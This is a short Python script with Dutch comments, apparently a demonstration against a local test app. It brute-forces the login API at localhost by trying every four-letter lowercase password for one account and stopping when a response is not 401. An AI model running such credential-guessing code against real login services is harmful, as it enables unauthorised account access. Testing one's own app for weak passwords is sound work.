import itertools
import requests

# Login endpoint
url = "http://localhost:3333/api/auth/login"

headers = {
    "Content-Type": "application/json"
}

## specificeer lengte van mogelijke wachtwoord
password_length = 4

## specificeer mogelijke caracters
combinationslower = itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=password_length)

# Probeert alle combinaties voor een email
count = 0
for guess in combinationslower:
    guess = ''.join(guess)
    params = {
     "email" : "slechtwachtwoord@gmail.com",
     "password": guess
    }
    response = requests.post(url, headers=headers, json=params)
    if response.status_code != 401:
        print(response.text)
        break